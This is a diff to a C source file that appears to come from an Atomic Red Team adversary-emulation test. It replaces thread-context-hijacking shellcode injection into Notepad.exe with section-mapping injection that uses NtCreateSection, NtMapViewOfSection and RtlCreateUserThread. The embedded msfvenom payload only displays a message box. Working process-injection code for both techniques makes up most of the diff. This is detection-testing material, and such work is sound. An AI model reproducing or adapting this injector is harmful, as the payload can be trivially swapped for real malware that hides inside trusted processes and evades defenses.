@@ -1,11 +1,8 @@
-/*
-    Injector for Atomic Red Team leveraging thread context hijacking (T1055.003) to inject shellcode in Notepad.exe.
-    Author: traceflow@0x8d.cc
-*/
-
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
+#pragma comment(lib, "ntdll")
+
 
 // msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Atomic Red Team" -f csharp
 unsigned char shellcode[] = {0xfc,0x48,0x81,0xe4,0xf0,0xff,
@@ -36,6 +33,60 @@ unsigned char shellcode[] = {0xfc,0x48,0x81,0xe4,0xf0,0xff,
 };
 
 unsigned int shellcode_len = sizeof(shellcode);
+
+typedef struct _CLIENT_ID {
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG Length;
+	HANDLE RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG Attributes;
+	PVOID SecurityDescriptor;
+	PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef NTSTATUS (NTAPI * NtCreateSection_t)(
+	OUT PHANDLE SectionHandle,
+	IN ULONG DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN PLARGE_INTEGER MaximumSize OPTIONAL,
+	IN ULONG PageAttributess,
+	IN ULONG SectionAttributes,
+	IN HANDLE FileHandle OPTIONAL); 
+
+typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
+	HANDLE SectionHandle,
+	HANDLE ProcessHandle,
+	PVOID * BaseAddress,
+	ULONG_PTR ZeroBits,
+	SIZE_T CommitSize,
+	PLARGE_INTEGER SectionOffset,
+	PSIZE_T ViewSize,
+	DWORD InheritDisposition,
+	ULONG AllocationType,
+	ULONG Win32Protect);
+
+typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
+	IN HANDLE ProcessHandle,
+	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+	IN BOOLEAN CreateSuspended,
+	IN ULONG StackZeroBits OPTIONAL,
+	IN OUT PULONG StackReserved OPTIONAL,
+	IN OUT PULONG StackCommit OPTIONAL,
+	IN PVOID StartAddress,
+	IN PVOID StartParameter OPTIONAL,
+	OUT PHANDLE ThreadHandle OPTIONAL,
+	OUT PCLIENT_ID ClientId OPTIONAL);
+
 
 int FindProcess(const char *procname) {
 
@@ -81,37 +132,44 @@ int FindThread(int pid) {
     return hThread;
 }
 
-int InjectContext(int pid, HANDLE hProc, unsigned char * shellcode, unsigned int shellcode_len) {
+int InjectSection(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode_len)
+{
+    HANDLE hSection = NULL;
+    PVOID pLocalSectionView = NULL;
+    PVOID pRemoteSectionView = NULL;
     HANDLE hThread = NULL;
-    LPVOID lpBase = NULL;
-    CONTEXT ctx;
 
-    hThread = FindThread(pid);
+    // Get pointers to the functions we need from ntdll.dll
+    NtCreateSection_t NtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
+    if(NtCreateSection == NULL) return -1;
+    NtMapViewOfSection_t NtMapViewOfSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
+    if(NtMapViewOfSection == NULL) return -1;
+    RtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
+    if(RtlCreateUserThread == NULL) return -1;
 
-    if(hThread == NULL) {
-        printf("Error when hijacking thread.\n");
-        return -1;
+    // Create section that can be shared betwwen processes.
+    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcode_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+    // Create local section view.
+    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionView, NULL, NULL, NULL, (SIZE_T *) &shellcode_len, ViewUnmap, NULL, PAGE_READWRITE);
+
+    // Copy payload in section.
+    memcpy(pLocalSectionView, shellcode, shellcode_len);
+
+    // Create remote section view in the target process.
+    NtMapViewOfSection(hSection, hProc, &pRemoteSectionView, NULL, NULL, NULL, (SIZE_T *) &shellcode_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
+
+    // Make the target process execute the shellcode.
+    RtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteSectionView, 0, &hThread, NULL);
+    if(hThread != NULL) {
+        WaitForSingleObject(hThread, 500);
+        CloseHandle(hThread);
+        return 0;
     }
 
     
-    lpBase = VirtualAllocEx(hProc, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    WriteProcessMemory(hProc, lpBase, (PVOID) shellcode, (SIZE_T) shellcode_len, (SIZE_T *) NULL);
-
-    
-    SuspendThread(hThread);
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(hThread, &ctx);
-
-#ifdef _M_IX86
-    ctx.Eip = (DWORD_PTR) lpBase;
-#else
-    ctx.Rip = (DWORD_PTR) lpBase;
-#endif
-    SetThreadContext(hThread, &ctx);
-
-    return ResumeThread(hThread);
-
 }
+
 
 int main(int argc, char *argv[]) {
     DWORD pid = 0;
